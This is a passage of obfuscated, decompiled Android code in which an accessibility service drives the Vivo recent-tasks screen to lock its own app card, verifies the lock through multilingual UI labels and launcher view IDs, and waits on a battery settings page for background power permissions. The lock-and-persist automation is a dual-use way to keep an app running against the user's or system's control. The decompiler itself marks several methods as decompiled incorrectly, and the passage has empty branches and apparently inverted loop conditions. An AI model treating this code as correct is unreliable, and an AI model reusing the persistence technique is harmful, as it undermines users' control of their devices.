                                                    t60.m214704c5(c0371a85.f55141a2, "[锁定流程] ⚠️ 第" + i6 + "次打开失败，重试...");
                                                }
                                                i2 = i6 + 1;
                                                i10 = 2;
                                                z = false;
                                                i11 = 1;
                                                c0371a85 = c0371a85;
                                                if (i2 < 4) {
                                                }
                                            }
                                        } else {
                                            i4++;
                                            i10 = 2;
                                            z = false;
                                            c0371a86 = c0371a84;
                                            if (i4 >= 11) {
                                                int i14 = i3;
                                                i = i5;
                                                i6 = i14;
                                                str = str2;
                                                c0371a85 = c0371a86;
                                                if (i == 0) {
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            String str7 = c0371a85.f55141a2;
                            if (i != 0) {
                                t60.m214704c5(str7, "[锁定流程] ⚠️ 未能打开最近任务列表");
                                return Boolean.FALSE;
                            }
                            try {
                                t60.m214704c5(str7, "[锁定流程] 等待页面稳定...");
                                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0 = c0371a85;
                                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1 = str;
                                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7 = 3;
                                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$12 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1;
                                c0371a82 = c0371a85;
                            } catch (Exception e) {
                                e = e;
                            }
                            try {
                                if (c0371a82.m212437g5(3, 50L, 1500L, vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$12) != coroutineSingletons) {
                                    c0371a83 = c0371a82;
                                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$12;
                                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0 = c0371a83;
                                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1 = str;
                                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7 = 4;
                                    if (b81.m210571b1(500L, vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1) == coroutineSingletons) {
                                        t60.m214704c5(c0371a83.f55141a2, "[锁定流程] 3. 横向滑动激活任务列表");
                                        c0371a83.m212426f4();
                                        vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0 = c0371a83;
                                        vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1 = str;
                                        vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7 = 5;
                                        if (b81.m210571b1(1000L, vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1) == coroutineSingletons) {
                                        }
                                        str3 = str;
                                        i7 = 1;
                                        if (i7 >= 6) {
                                            t60.m214704c5(c0371a83.f55141a2, "[锁定流程] 4." + i7 + " 查找APP卡片...");
                                            Rect rectM212411c9 = c0371a83.m212411c9(str3);
                                            if (rectM212411c9 == null) {
                                                t60.m214704c5(c0371a83.f55141a2, "[锁定流程] 未找到APP，向左滑动...");
                                                c0371a83.m212426f4();
                                                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0 = c0371a83;
                                                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1 = str3;
                                                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54968a2 = i7;
                                                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7 = 8;
                                                break;
                                            } else {
                                                t60.m214704c5(c0371a83.f55141a2, "[锁定流程] ✅ 找到APP卡片: " + rectM212411c9);
                                                t60.m214704c5(c0371a83.f55141a2, "[锁定流程] 在APP位置执行下滑锁定...");
                                                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0 = c0371a83;
                                                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1 = str3;
                                                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54968a2 = i7;
                                                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7 = 6;
                                                objM212427f5 = c0371a83.m212427f5((float) rectM212411c9.centerX(), ((float) c0371a83.m212414e1()) * 0.3f, c0371a83.m212414e1() * 0.65f, vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1);
                                                if (objM212427f5 != coroutineSingletons) {
                                                    if (((Boolean) objM212427f5).booleanValue()) {
                                                        t60.m214704c5(c0371a83.f55141a2, "[锁定流程] ❌ 下滑手势执行失败（超时或取消）");
                                                        i8 = 1;
                                                        i7 += i8;
                                                        if (i7 >= 6) {
                                                            t60.m214704c5(c0371a83.f55141a2, "[锁定流程] ❌ 本次尝试锁定失败");
                                                            return Boolean.FALSE;
                                                        }
                                                    } else {
                                                        vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0 = c0371a83;
                                                        vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1 = str3;
                                                        vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54968a2 = i7;
                                                        vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7 = 7;
                                                        if (b81.m210571b1(1000L, vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1) == coroutineSingletons) {
                                                        }
                                                        iOrdinal = c0371a83.m212435g3().ordinal();
                                                        if (iOrdinal == 0) {
                                                            t60.m214704c5(c0371a83.f55141a2, "[锁定流程] ✅✅✅ 验证通过：APP已锁定");
                                                            return Boolean.TRUE;
                                                        }
                                                        if (iOrdinal == 1) {
                                                            t60.m214704c5(c0371a83.f55141a2, "[锁定流程] ❌ 验证失败：仍未锁定，继续尝试");
                                                        } else if (iOrdinal == 2) {
                                                            t60.m214704c5(c0371a83.f55141a2, "[锁定流程] ⚠️ 无法验证锁定状态，假设成功");
                                                            return Boolean.TRUE;
                                                        }
                                                        i8 = 1;
                                                        i7 += i8;
                                                        if (i7 >= 6) {
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            } catch (Exception e2) {
                                e = e2;
                                c0371a85 = c0371a82;
                                tz0.m214807a7("[锁定流程] ❌ 异常: ", e.getMessage(), c0371a85.f55141a2);
                                return Boolean.FALSE;
                            }
                        }
                        return coroutineSingletons;
                    } catch (Exception e3) {
                        e = e3;
                        c0371a85 = this;
                        tz0.m214807a7("[锁定流程] ❌ 异常: ", e.getMessage(), c0371a85.f55141a2);
                        return Boolean.FALSE;
                    }
                case 1:
                    str = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1;
                    C0371a8 c0371a87 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0;
                    kg1.m213544f4(objM212427f5);
                    c0371a8 = c0371a87;
                    t60.m214704c5(c0371a8.f55141a2, "[锁定流程] 2. 打开最近任务列表");
                    i = 0;
                    i2 = 1;
                    c0371a85 = c0371a8;
                    if (i2 < 4) {
                    }
                    String str72 = c0371a85.f55141a2;
                    if (i != 0) {
                    }
                    break;
                case 2:
                    i4 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54970a4;
                    i3 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54969a3;
                    int i15 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54968a2;
                    str2 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1;
                    C0371a8 c0371a88 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0;
                    try {
                        kg1.m213544f4(objM212427f5);
                        i5 = i15;
                        c0371a84 = c0371a88;
                        rootInActiveWindow = c0371a84.f55139a0.getRootInActiveWindow();
                        if (rootInActiveWindow != null) {
                        }
                        if (i5 == 0) {
                        }
                    } catch (Exception e4) {
                        e = e4;
                        c0371a85 = c0371a88;
                        tz0.m214807a7("[锁定流程] ❌ 异常: ", e.getMessage(), c0371a85.f55141a2);
                        return Boolean.FALSE;
                    }
                    break;
                case 3:
                    str = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1;
                    c0371a83 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0;
                    kg1.m213544f4(objM212427f5);
                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0 = c0371a83;
                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1 = str;
                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7 = 4;
                    if (b81.m210571b1(500L, vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1) == coroutineSingletons) {
                    }
                    return coroutineSingletons;
                case 4:
                    str = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1;
                    c0371a83 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0;
                    kg1.m213544f4(objM212427f5);
                    t60.m214704c5(c0371a83.f55141a2, "[锁定流程] 3. 横向滑动激活任务列表");
                    c0371a83.m212426f4();
                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0 = c0371a83;
                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1 = str;
                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7 = 5;
                    if (b81.m210571b1(1000L, vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1) == coroutineSingletons) {
                    }
                    str3 = str;
                    i7 = 1;
                    if (i7 >= 6) {
                    }
                    break;
                case 5:
                    str = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1;
                    c0371a83 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0;
                    kg1.m213544f4(objM212427f5);
                    str3 = str;
                    i7 = 1;
                    if (i7 >= 6) {
                    }
                    break;
                case 6:
                    i7 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54968a2;
                    str3 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1;
                    c0371a83 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0;
                    kg1.m213544f4(objM212427f5);
                    if (((Boolean) objM212427f5).booleanValue()) {
                    }
                    break;
                case 7:
                    i7 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54968a2;
                    str3 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1;
                    c0371a83 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0;
                    kg1.m213544f4(objM212427f5);
                    iOrdinal = c0371a83.m212435g3().ordinal();
                    if (iOrdinal == 0) {
                    }
                    break;
                case 8:
                    i7 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54968a2;
                    str3 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1;
                    c0371a83 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0;
                    kg1.m213544f4(objM212427f5);
                    i8 = 1;
                    i7 += i8;
                    if (i7 >= 6) {
                    }
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        } catch (Exception e5) {
            e = e5;
        }
    }

    /* renamed from: g2 */
    public final boolean m212434g2(String str, List list) {
        String string;
        AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
        boolean z = false;
        if (rootInActiveWindow == null) {
            return false;
        }
        CharSequence packageName = rootInActiveWindow.getPackageName();
        if (packageName == null || (string = packageName.toString()) == null) {
            string = "";
        }
        rootInActiveWindow.recycle();
        if (list == null || !list.isEmpty()) {
            Iterator it = list.iterator();
            while (true) {
                if (!it.hasNext()) {
                    break;
                }
                if (AbstractC0779a1.m213652a5(string, (String) it.next(), true)) {
                    z = true;
                    break;
                }
            }
        }
        if (!z) {
            StringBuilder sbM41c2 = AbstractC0003a2.m41c2("[", str, "] ❌ 包名不匹配: 期望=", AbstractC0715je.m213295i2(list, null, null, null, null, 63), ", 实际=");
            sbM41c2.append(string);
            t60.m214704c5(this.f55141a2, sbM41c2.toString());
        }
        return z;
    }

    /* renamed from: g3 */
    public final VivoSteps$VivoLockVerifyResult m212435g3() {
        VivoSteps$VivoLockVerifyResult vivoSteps$VivoLockVerifyResult;
        String string;
        String string2;
        String str;
        AccessibilityNodeInfo next;
        String string3;
        String string4;
        String str2 = this.f55141a2;
        AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
        VivoSteps$VivoLockVerifyResult vivoSteps$VivoLockVerifyResult2 = VivoSteps$VivoLockVerifyResult.f54740a2;
        try {
            if (rootInActiveWindow != null) {
                try {
                    Iterator it = AbstractC0716jf.m213306g5("解锁", "解鎖", "Unlock", "UNLOCK", "취소 잠금", "잠금 해제").iterator();
                    loop0: while (true) {
                        boolean zHasNext = it.hasNext();
                        vivoSteps$VivoLockVerifyResult = VivoSteps$VivoLockVerifyResult.f54738a0;
                        if (!zHasNext) {
                            for (String str3 : AbstractC0716jf.m213306g5("锁定", "鎖定", "加锁", "Lock", "LOCK", "잠금", "잠그기")) {
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str3);
                                if (listFindAccessibilityNodeInfosByText != null) {
                                    for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                                        if (accessibilityNodeInfo.isVisibleToUser()) {
                                            CharSequence text = accessibilityNodeInfo.getText();
                                            if (text == null || (string = text.toString()) == null) {
                                                string = "";
                                            }
                                            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                                            if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                                                string2 = "";
                                            }
                                            if ((string.equals(str3) || string2.equals(str3)) && !AbstractC0779a1.m213652a5(string, "已", false) && !AbstractC0779a1.m213652a5(string, "解", false) && !AbstractC0779a1.m213652a5(string2, "已", false) && !AbstractC0779a1.m213652a5(string2, "解", false)) {
                                                t60.m214704c5(str2, "[VIVO锁定验证] ⚠️ 找到'" + str3 + "'按钮 → 未锁定");
                                                accessibilityNodeInfo.recycle();
                                                rootInActiveWindow.recycle();
                                                VivoSteps$VivoLockVerifyResult vivoSteps$VivoLockVerifyResult3 = VivoSteps$VivoLockVerifyResult.f54739a1;
                                                try {
                                                    rootInActiveWindow.recycle();
                                                } catch (Exception unused) {
                                                }
                                                return vivoSteps$VivoLockVerifyResult3;
                                            }
                                        }
                                        accessibilityNodeInfo.recycle();
                                    }
                                }
                            }
                            for (String str4 : AbstractC0716jf.m213306g5("已锁定", "已鎖定", "已加锁", "Locked", "LOCKED", "Pinned", "잠김", "잠금됨")) {
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText(str4);
                                if (listFindAccessibilityNodeInfosByText2 != null) {
                                    for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText2) {
                                        if (accessibilityNodeInfo2.isVisibleToUser()) {
                                            t60.m214704c5(str2, "[VIVO锁定验证] ✅ 找到'" + str4 + "'状态 → 已锁定");
                                            accessibilityNodeInfo2.recycle();
                                            rootInActiveWindow.recycle();
                                            try {
                                                rootInActiveWindow.recycle();
                                            } catch (Exception unused2) {
                                            }
                                            return vivoSteps$VivoLockVerifyResult;
                                        }
                                        accessibilityNodeInfo2.recycle();
                                    }
                                }
                            }
                            for (String str5 : AbstractC0716jf.m213306g5("com.vivo.launcher:id/lock_icon", "com.vivo.launcher:id/iv_lock", "com.vivo.launcher:id/task_lock", "com.bbk.launcher2:id/lock_icon", "com.bbk.launcher2:id/iv_lock")) {
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str5);
                                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                                    Iterator<T> it2 = listFindAccessibilityNodeInfosByViewId.iterator();
                                    while (it2.hasNext()) {
                                        if (((AccessibilityNodeInfo) it2.next()).isVisibleToUser()) {
                                            t60.m214704c5(str2, "[VIVO锁定验证] ✅ 找到锁定图标: " + str5 + " → 已锁定");
                                            rootInActiveWindow.recycle();
                                            try {
                                                rootInActiveWindow.recycle();
                                            } catch (Exception unused3) {
                                            }
                                            return vivoSteps$VivoLockVerifyResult;
                                        }
                                    }
                                }
                            }
                            t60.m214704c5(str2, "[VIVO锁定验证] ⚠️ 无法确认锁定状态");
                            try {
                                rootInActiveWindow.recycle();
                            } catch (Exception unused4) {
                            }
                            return vivoSteps$VivoLockVerifyResult2;
                        }
                        str = (String) it.next();
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText3 = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                        if (listFindAccessibilityNodeInfosByText3 != null) {
                            Iterator<AccessibilityNodeInfo> it3 = listFindAccessibilityNodeInfosByText3.iterator();
                            while (it3.hasNext()) {
                                next = it3.next();
                                if (next.isVisibleToUser()) {
                                    CharSequence text2 = next.getText();
                                    if (text2 == null || (string3 = text2.toString()) == null) {
                                        string3 = "";
                                    }
                                    CharSequence contentDescription2 = next.getContentDescription();
                                    if (contentDescription2 == null || (string4 = contentDescription2.toString()) == null) {
                                        string4 = "";
                                    }
                                    if (string3.equals(str) || string4.equals(str) || t60.m214686a2(AbstractC0779a1.m213687e0(string3).toString(), str) || t60.m214686a2(AbstractC0779a1.m213687e0(string4).toString(), str)) {
                                        break loop0;
                                    }
                                }
                                next.recycle();
                            }
                        }
                    }
                    t60.m214704c5(str2, "[VIVO锁定验证] ✅ 找到'" + str + "'按钮 → 已锁定");
                    next.recycle();
                    rootInActiveWindow.recycle();
                    try {
                        rootInActiveWindow.recycle();
                    } catch (Exception unused5) {
                    }
                    return vivoSteps$VivoLockVerifyResult;
                } catch (Exception e) {
                    t60.m214704c5(str2, "[VIVO锁定验证] 异常: " + e.getMessage());
                    try {
                        rootInActiveWindow.recycle();
                    } catch (Exception unused6) {
                    }
                }
            }
            return vivoSteps$VivoLockVerifyResult2;
        } catch (Throwable th) {
            try {
                rootInActiveWindow.recycle();
            } catch (Exception unused7) {
            }
            throw th;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:57:0x0118, code lost:
    
        if (p000.b81.m210571b1(300, r1) == r3) goto L62;
     */
    /* JADX WARN: Code restructure failed: missing block: B:61:0x0142, code lost:
    
        if (p000.b81.m210571b1(3000, r1) == r3) goto L62;
     */
    /* JADX WARN: Removed duplicated region for block: B:19:0x0065  */
    /* JADX WARN: Removed duplicated region for block: B:60:0x011e  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:57:0x0118 -> B:59:0x011b). Please report as a decompilation issue!!! */
    /* renamed from: g4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212436g4(int i, long j, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$waitForBatteryAppListLoaded$1 vivoSteps$waitForBatteryAppListLoaded$1;
        C0371a8 c0371a8;
        int i2;
        C0371a8 c0371a82;
        long jCurrentTimeMillis;
        int i3;
        long j2;
        int size;
        int size2;
        int size3;
        if (continuationImpl instanceof VivoSteps$waitForBatteryAppListLoaded$1) {
            vivoSteps$waitForBatteryAppListLoaded$1 = (VivoSteps$waitForBatteryAppListLoaded$1) continuationImpl;
            int i4 = vivoSteps$waitForBatteryAppListLoaded$1.f54981a7;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                vivoSteps$waitForBatteryAppListLoaded$1.f54981a7 = i4 - Integer.MIN_VALUE;
                c0371a8 = this;
            } else {
                c0371a8 = this;
                vivoSteps$waitForBatteryAppListLoaded$1 = new VivoSteps$waitForBatteryAppListLoaded$1(c0371a8, continuationImpl);
            }
        }
        Object obj = vivoSteps$waitForBatteryAppListLoaded$1.f54979a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i5 = vivoSteps$waitForBatteryAppListLoaded$1.f54981a7;
        if (i5 == 0) {
            kg1.m213544f4(obj);
            i2 = i;
            c0371a82 = c0371a8;
            jCurrentTimeMillis = System.currentTimeMillis();
            i3 = 0;
            j2 = j;
            if (System.currentTimeMillis() - jCurrentTimeMillis >= j2) {
            }
            return coroutineSingletons;
        }
        if (i5 != 1) {
            if (i5 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return Boolean.FALSE;
        }
        i3 = vivoSteps$waitForBatteryAppListLoaded$1.f54976a2;
        long j3 = vivoSteps$waitForBatteryAppListLoaded$1.f54978a4;
        long j4 = vivoSteps$waitForBatteryAppListLoaded$1.f54977a3;
        int i6 = vivoSteps$waitForBatteryAppListLoaded$1.f54975a1;
        c0371a82 = vivoSteps$waitForBatteryAppListLoaded$1.f54974a0;
        kg1.m213544f4(obj);
        jCurrentTimeMillis = j3;
        j2 = j4;
        i2 = i6;
        if (System.currentTimeMillis() - jCurrentTimeMillis >= j2) {
            i3++;
            AccessibilityNodeInfo rootInActiveWindow = c0371a82.f55139a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("智能控制");
                if (listFindAccessibilityNodeInfosByText != null) {
                    ArrayList arrayList = new ArrayList();
                    for (Object obj2 : listFindAccessibilityNodeInfosByText) {
                        if (((AccessibilityNodeInfo) obj2).isVisibleToUser()) {
                            arrayList.add(obj2);
                        }
                    }
                    size = arrayList.size();
                } else {
                    size = 0;
                }
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText("允许后台高耗电");
                if (listFindAccessibilityNodeInfosByText2 != null) {
                    ArrayList arrayList2 = new ArrayList();
                    for (Object obj3 : listFindAccessibilityNodeInfosByText2) {
                        if (((AccessibilityNodeInfo) obj3).isVisibleToUser()) {
                            arrayList2.add(obj3);
                        }
                    }
                    size2 = arrayList2.size();
                } else {
                    size2 = 0;
                }
                int i7 = size + size2;
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText3 = rootInActiveWindow.findAccessibilityNodeInfosByText("今日后台耗电");
                if (listFindAccessibilityNodeInfosByText3 != null) {
                    ArrayList arrayList3 = new ArrayList();
                    for (Object obj4 : listFindAccessibilityNodeInfosByText3) {
                        if (((AccessibilityNodeInfo) obj4).isVisibleToUser()) {
                            arrayList3.add(obj4);
                        }
                    }
                    size3 = arrayList3.size();
                } else {
                    size3 = 0;
                }
                int i8 = i7 + size3;
                rootInActiveWindow.recycle();
                if (i8 >= i2) {
                    return Boolean.TRUE;
                }
            }
            vivoSteps$waitForBatteryAppListLoaded$1.f54974a0 = c0371a82;
            vivoSteps$waitForBatteryAppListLoaded$1.f54975a1 = i2;
            vivoSteps$waitForBatteryAppListLoaded$1.f54977a3 = j2;
            vivoSteps$waitForBatteryAppListLoaded$1.f54978a4 = jCurrentTimeMillis;
            vivoSteps$waitForBatteryAppListLoaded$1.f54976a2 = i3;
            vivoSteps$waitForBatteryAppListLoaded$1.f54981a7 = 1;
        } else {
            t60.m214726f4(c0371a82.f55141a2, "[等待列表] ⚠️ 超时未检测到" + i2 + "个标签，等待3秒后继续...");
            vivoSteps$waitForBatteryAppListLoaded$1.f54974a0 = null;
            vivoSteps$waitForBatteryAppListLoaded$1.f54981a7 = 2;
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: g5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212437g5(int i, long j, long j2, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$waitForPageStable$1 vivoSteps$waitForPageStable$1;
        C0371a8 c0371a8;
        long j3;
        VivoSteps$waitForPageStable$1 vivoSteps$waitForPageStable$12;
        C0371a8 c0371a82;
        long jCurrentTimeMillis;
        int i2;
        int i3;
        long j4;
        int i4;
        int i5;
        int i6;
        int iM212374b2;
        if (continuationImpl instanceof VivoSteps$waitForPageStable$1) {
            vivoSteps$waitForPageStable$1 = (VivoSteps$waitForPageStable$1) continuationImpl;
            int i7 = vivoSteps$waitForPageStable$1.f54992b0;
            if ((i7 & Integer.MIN_VALUE) != 0) {
                vivoSteps$waitForPageStable$1.f54992b0 = i7 - Integer.MIN_VALUE;
                c0371a8 = this;
            } else {
                c0371a8 = this;
                vivoSteps$waitForPageStable$1 = new VivoSteps$waitForPageStable$1(c0371a8, continuationImpl);
            }
        }
        Object obj = vivoSteps$waitForPageStable$1.f54990a8;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i8 = vivoSteps$waitForPageStable$1.f54992b0;
        int i9 = 1;
        if (i8 == 0) {
            kg1.m213544f4(obj);
            j3 = j2;
            vivoSteps$waitForPageStable$12 = vivoSteps$waitForPageStable$1;
            c0371a82 = c0371a8;
            jCurrentTimeMillis = System.currentTimeMillis();
            i2 = 0;
            i3 = 0;
            j4 = j;
            i4 = -1;
            i5 = i;
        } else {
            if (i8 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i10 = vivoSteps$waitForPageStable$1.f54986a4;
            int i11 = vivoSteps$waitForPageStable$1.f54985a3;
            int i12 = vivoSteps$waitForPageStable$1.f54984a2;
            long j5 = vivoSteps$waitForPageStable$1.f54989a7;
            long j6 = vivoSteps$waitForPageStable$1.f54988a6;
            long j7 = vivoSteps$waitForPageStable$1.f54987a5;
            int i13 = vivoSteps$waitForPageStable$1.f54983a1;
            C0371a8 c0371a83 = vivoSteps$waitForPageStable$1.f54982a0;
            kg1.m213544f4(obj);
            i5 = i13;
            vivoSteps$waitForPageStable$12 = vivoSteps$waitForPageStable$1;
            c0371a82 = c0371a83;
            i4 = i12;
            i2 = i10;
            i3 = i11;
            j3 = j6;
            j4 = j7;
            jCurrentTimeMillis = j5;
        }
        while (System.currentTimeMillis() - jCurrentTimeMillis < j3) {
            i2++;
            AccessibilityNodeInfo rootInActiveWindow = c0371a82.f55139a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                i6 = i9;
                iM212374b2 = m212374b2(rootInActiveWindow);
            } else {
                i6 = i9;
                iM212374b2 = 0;
            }
            if (rootInActiveWindow != null) {
                rootInActiveWindow.recycle();
            }
            if (iM212374b2 != i4 || iM212374b2 <= 0) {
                i4 = iM212374b2;
                i3 = 0;
            } else {
                i3++;
                if (i3 >= i5) {
                    return Boolean.TRUE;
                }
            }
            vivoSteps$waitForPageStable$12.f54982a0 = c0371a82;
            vivoSteps$waitForPageStable$12.f54983a1 = i5;
            vivoSteps$waitForPageStable$12.f54987a5 = j4;
            vivoSteps$waitForPageStable$12.f54988a6 = j3;
            vivoSteps$waitForPageStable$12.f54989a7 = jCurrentTimeMillis;
            vivoSteps$waitForPageStable$12.f54984a2 = i4;
            vivoSteps$waitForPageStable$12.f54985a3 = i3;
            vivoSteps$waitForPageStable$12.f54986a4 = i2;
            i9 = i6;
            vivoSteps$waitForPageStable$12.f54992b0 = i9;
            if (c0371a82.m212415e3(j4, vivoSteps$waitForPageStable$12) == coroutineSingletons) {
                return coroutineSingletons;
            }
        }
        t60.m214726f4(c0371a82.f55141a2, "[等待页面稳定] ⚠️ 超时: 等待" + j3 + "ms后仍未稳定 (检查" + i2 + "次, 当前节点数:" + i4 + ")");
        return Boolean.FALSE;
    }
}
